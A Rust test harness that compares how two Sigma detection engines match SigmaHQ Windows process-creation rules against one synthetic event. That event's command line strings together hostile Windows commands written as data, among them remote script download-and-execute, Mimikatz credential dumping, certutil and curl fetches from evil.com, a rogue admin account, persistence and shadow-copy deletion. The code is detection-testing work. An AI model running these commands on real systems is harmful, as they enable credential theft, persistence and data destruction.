use null_sigma_harness::load_rule_dir;
use std::collections::HashMap;
use std::path::PathBuf;

fn main() {
    let rule_dir = PathBuf::from("corpus/sigmahq/rules/windows/process_creation");
    let report = load_rule_dir(&rule_dir).expect("failed to load rule dir");
    let common = report.common();

    let mut attack_event = HashMap::new();
    let attack_cmd = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden \
        -EncodedCommand SQBFAFgA -c \"IEX ((New-Object Net.WebClient).DownloadString('http://127.0.0.1/malware.ps1')); \
        Invoke-Mimikatz -DumpCreds; certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\DismHost.exe; \
        schtasks.exe /create /tn EvilUpdate /tr C:\\Windows\\Temp\\DismHost.exe /sc onlogon /ru SYSTEM; \
        reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d calc.exe /f; \
        net.exe user /add hacker Password123!; net.exe localgroup administrators hacker /add; \
        vssadmin.exe delete shadows /all /quiet; bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures; \
        wmic.exe process call create cmd.exe; rundll32.exe C:\\Windows\\Temp\\test.dll,DllRegisterServer; \
        mshta.exe javascript:a=GetObject('script:http://evil.com/a.hta'); curl.exe -s http://evil.com/sh | sh\"";

    attack_event.insert("category".into(), "process_creation".into());
    attack_event.insert("product".into(), "windows".into());
    attack_event.insert("EventID".into(), "1".into());
    attack_event.insert(
        "Image".into(),
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".into(),
    );
    attack_event.insert("CommandLine".into(), attack_cmd.into());
    attack_event.insert("ParentImage".into(), r"C:\Windows\System32\cmd.exe".into());
    attack_event.insert("User".into(), r"NT AUTHORITY\SYSTEM".into());
    attack_event.insert("IntegrityLevel".into(), "System".into());

    let tau_event = serde_json::to_value(&attack_event).unwrap();

    let mut ns_matches = Vec::new();
    for (i, r) in common.iter().enumerate() {
        let mut single_ns = null_sigma::SigmaEngine::new();
        if single_ns.load_rule(&r.yaml).is_ok()
            && !single_ns.evaluate_event(&attack_event).is_empty()
        {
            ns_matches.push(i);
        }
    }

    let mut tau_matches = Vec::new();
    for (i, r) in common.iter().enumerate() {
        if let Ok(tau_rule) = null_sigma_harness::convert::sigma_to_tau(&r.yaml) {
            if tau_rule.matches(&tau_event) {
                tau_matches.push(i);
            }
        }
    }

    println!("Total common rules: {}", common.len());
    println!(
        "null-sigma matches (individual rule evaluation): {}",
        ns_matches.len()
    );
    println!(
        "tau-engine matches (individual rule evaluation): {}",
        tau_matches.len()
    );

    let dropped: Vec<usize> = ns_matches
        .iter()
        .filter(|i| !tau_matches.contains(i))
        .copied()
        .collect();
    println!(
        "Rules matched by null-sigma but DROPPED by tau-engine: {}",
        dropped.len()
    );
    for idx in dropped {
        let title = null_sigma_harness::rule_title(&common[idx].yaml);
        println!("  - Dropped rule {}: {}", common[idx].path, title);
        if let Ok(tau_rule) = null_sigma_harness::convert::sigma_to_tau(&common[idx].yaml) {
            println!("    Tau expression: {}", tau_rule.detection.expression);
        }
    }
}
